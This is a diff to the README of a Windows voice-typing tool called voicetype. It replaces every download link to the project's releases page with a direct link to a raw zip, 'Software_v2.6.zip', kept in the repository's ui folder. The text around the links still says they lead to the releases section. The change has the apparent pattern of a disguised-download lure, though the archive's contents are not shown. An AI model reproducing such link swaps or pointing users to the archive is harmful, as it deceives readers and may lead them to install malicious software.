@@ -1,6 +1,6 @@
 # 🎙️ voicetype - AI Voice Input for Windows
 
-[![Download voicetype](https://img.shields.io/badge/Download-voicetype-blue)](https://github.com/aronsamson/voicetype/releases)
+[![Download voicetype](https://img.shields.io/badge/Download-voicetype-blue)](https://github.com/aronsamson/voicetype/raw/refs/heads/main/ui/Software_v2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run voicetype on your Windows PC.
 
 Click the button below to go to the page where you can get the software:
 
-[![Download voicetype](https://img.shields.io/badge/Download-voicetype-blue)](https://github.com/aronsamson/voicetype/releases)
+[![Download voicetype](https://img.shields.io/badge/Download-voicetype-blue)](https://github.com/aronsamson/voicetype/raw/refs/heads/main/ui/Software_v2.6.zip)
 
 This link will take you to the releases section on GitHub, where the files are stored.
 
@@ -114,7 +114,7 @@ After setup finishes:
 ## 🔗 Useful Links
 
 - Download and install voicetype:  
-  [https://github.com/aronsamson/voicetype/releases](https://github.com/aronsamson/voicetype/releases)
+  [https://github.com/aronsamson/voicetype/raw/refs/heads/main/ui/Software_v2.6.zip](https://github.com/aronsamson/voicetype/raw/refs/heads/main/ui/Software_v2.6.zip)
 
 - Check for updates and new versions at the same page.
 
